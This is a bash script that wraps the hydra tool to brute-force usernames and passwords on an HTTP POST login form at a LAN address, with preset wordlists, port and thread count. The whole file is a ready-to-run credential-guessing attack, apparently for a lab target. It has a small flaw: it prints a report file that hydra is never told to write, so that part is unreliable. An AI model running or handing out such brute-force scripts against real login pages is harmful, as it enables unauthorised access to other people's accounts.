#!/bin/bash

# -L
nameList='/usr/share/wordlists/metasploit/namelist.txt';

# -P
#wordList='/usr/share/wordlists/rockyou.txt';
#wordList='/usr/share/brutex/wordlists/namelist.txt';
#wordList='/usr/share/dnsrecon/namelist.txt';
wordList='/usr/share/sniper/plugins/BruteX/wordlists/namelist.txt';

# sudo password
#read -p "Enter sudo password: " -r -s sudo_passwd;

# Target IP
#read -p "Enter target IP [192.168.2.65]: " target;
target='192.168.2.65';

# Port
#read -p "Enter ${target}:PORT [8080/8081/8082]: " port;
port='8082';

# -t 
#read -p "Enter thread [4-16]: " thread;
thread='16';

# Report path
user=$(whoami);
reportPath="/home/${user}/Desktop/hydra.txt";

hydra -L ${nameList} -P ${wordList} ${target} -s ${port} http-post-form "/login.php:username=^USER^&password=^PASS^:login failed" -t ${thread} -vV;
if [[ ${?} -eq 0 ]];
then
    echo "Succeeded hydraAttack :D!";
    echo "Result is as below: ";
    echo "===========================";
    cat ${reportPath};
    echo "===========================";
    exit 0;
else
    echo "Failed to launch hydra attack :(";
    exit 1;
fi
exit 0
